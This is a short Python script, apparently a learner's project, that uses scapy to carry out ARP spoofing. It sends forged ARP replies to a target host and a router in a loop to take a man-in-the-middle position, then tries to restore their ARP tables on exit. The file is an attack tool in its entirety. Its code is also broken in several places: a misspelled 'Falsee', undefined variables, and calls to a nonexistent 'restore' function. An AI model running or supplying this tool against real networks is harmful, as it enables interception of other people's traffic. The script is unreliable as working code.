#!/usr/bin/env python3

# ---- Algorithm ----
# 1. Get mac address of target using target IP -- DONE
# 2. Create a response from the target host
# 3. Restore to normal. 
# 4. Optional: Create a command line function

import scapy.all as scapy
import argparse, time

def get_cmd_args():
   parser = argparse.ArgumentParser(
      prog="arp_spoof",
      description="Man in the middle",
      epilog="Thank you for using %(prog)s :)"
   )
   parser.add_argument("-t", "--target", help="Ip address of target host")
   parser.add_argument("-s", "--source", help="Ip address of router")
   args = parser.parse_args()
   return args

def get_mac(ip) -> str:
    # Create an ARP packet
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    layer2_packet = broadcast/arp_request

    #Send packet
    answered = scapy.srp(layer2_packet, timeout=1, verbose=0)[0]
    return answered[0][1].hwsrc
    
def spoof(target_ip, src_ip):
    target_mac = get_mac(target_ip)
    response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=src_ip)
    scapy.send(response_packet, verbose=Falsee)

def restore_arp_table(target_ip, src_ip):
    dst_mac = get_mac(target_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=dst_mac, psrc=source_ip, hwsrc=src_mac)
    scapy.send(packet, verbose=False)


def run():
    cmd_args = get_cmd_args()
    target_ip = cmd_args.target
    src_ip = cmd_args.source
    try:
        sent_packet_counter = 0
        while True:
            spoof(target_ip, src_ip) # Fool the targe host
            spoof(src_ip, target_ip) # Fool the router
            sent_packet_counter += 2
            print(f'[+] Press Ctrl+C to terminate. \n Packets sent: {sent_packet_count}', end="\r", flush=True)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f'\n CTRL+C detected ... Restoring ARP tables ... please wait ... Quitting')
        restore(target_ip, src_ip)
        restore(src_ip, target_ip)

if __name__ == "__main__":
    run()